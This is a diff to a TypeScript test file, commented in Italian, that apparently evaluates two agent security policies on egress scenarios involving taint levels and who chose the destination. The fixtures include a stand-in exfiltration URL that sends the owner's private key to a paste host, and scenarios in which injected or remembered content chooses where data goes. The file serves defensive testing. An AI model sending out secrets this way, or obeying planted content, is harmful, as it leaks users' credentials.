@@ -1,7 +1,7 @@
-import type { ResourceChooser } from './candidate-b.js';
-import { OWNER } from './baseline.js';
-import { SECURITY_BASELINE_SCENARIOS, type SecurityBaselineScenario } from './scenarios.js';
 import type { Decision } from '../../core/policy/types.js';
+import { OWNER } from './baseline.js';
+import type { ResourceChooser } from './candidate-b.js';
+import { SECURITY_BASELINE_SCENARIOS, type SecurityBaselineScenario } from './scenarios.js';
 
 /**
  * I fatti di flusso che candidate B legge, e le scene che A e B decidono
@@ -63,7 +63,7 @@ const FLOW_SCENARIOS: readonly FlowScenario[] = [
     flow: 'owner',
     expectTuple: 'allow',
     claim:
-      "l'owner nomina una destinazione e ci manda dei byte: B-tupla (che sa chi ha scelto) la lascia passare ed è il membro «utility» della coppia — A invece, dal 22/09 (lane #624 + #641, soffitto 1), chiede anche qui: lo scalare non ha il campo «chi ha scelto», quindi tratta la scena legittima come quella avvelenata",
+      "l'owner nomina una destinazione e ci manda dei byte: B-tupla (che sa chi ha scelto) la lascia passare ed è il membro «utility» della coppia — A, dal 26/11, chiede anche a taint 0: query, userinfo e fragment sono sempre un canale di esfiltrazione a meno che l'URL non sia quoted, e lo scalare non ha il campo «chi ha scelto»",
     action: {
       principal: OWNER,
       tenant: 'host',
@@ -72,7 +72,7 @@ const FLOW_SCENARIOS: readonly FlowScenario[] = [
       args: { url: 'https://paste.example.test/collect?q=changelog' },
       ambientTaint: 2,
     },
-    expect: { ambient: 'ask', noAmbient: 'allow' },
+    expect: { ambient: 'ask', noAmbient: 'ask' },
   },
   {
     id: 'f2-egress-allowlisted-content-chosen',
@@ -102,7 +102,7 @@ const FLOW_SCENARIOS: readonly FlowScenario[] = [
      * che l'owner aveva già approvato.
      */
     claim:
-      "la stessa richiesta, con la destinazione scelta dal contenuto letto: A non ha un campo in cui la differenza possa esistere e dal 22/09 chiede in entrambi i casi (prima lasciava passare a taint 2) — vero prima di ADR-0066 con l'allowlist, vero dopo senza",
+      "la stessa richiesta, con la destinazione scelta dal contenuto letto: A non ha un campo in cui la differenza possa esistere e dal 26/11 chiede in entrambi i casi, anche a taint 0, perché la query è un canale di esfiltrazione — B resta l'unico a distinguere i due (allow contro deny)",
     action: {
       principal: OWNER,
       tenant: 'host',
@@ -111,7 +111,7 @@ const FLOW_SCENARIOS: readonly FlowScenario[] = [
       args: { url: 'https://paste.example.test/collect?data=chiave-privata-dell-owner' },
       ambientTaint: 2,
     },
-    expect: { ambient: 'ask', noAmbient: 'allow' },
+    expect: { ambient: 'ask', noAmbient: 'ask' },
   },
   {
     id: 'f3-egress-allowlisted-content-chosen-tier3',
@@ -119,7 +119,7 @@ const FLOW_SCENARIOS: readonly FlowScenario[] = [
     flow: 'content',
     expectTuple: 'deny',
     claim:
-      'un gradino di taint più su la stessa esfiltrazione diventa una domanda per A — cioè resta raggiungibile con un sì — mentre per B è la stessa negazione di f2',
+      'un gradino di taint più su la stessa esfiltrazione resta una domanda per A — raggiungibile con un sì — mentre per B è la stessa negazione di f2; dal 26/11 anche il ramo a taint 0 chiede, perché la query è sempre un canale di esfiltrazione',
     action: {
       principal: OWNER,
       tenant: 'host',
@@ -128,7 +128,7 @@ const FLOW_SCENARIOS: readonly FlowScenario[] = [
       args: { url: 'https://paste.example.test/collect?data=chiave-privata-dell-owner' },
       ambientTaint: 3,
     },
-    expect: { ambient: 'ask', noAmbient: 'allow' },
+    expect: { ambient: 'ask', noAmbient: 'ask' },
   },
   {
     id: 'f4-remembered-instruction-chose-the-write',
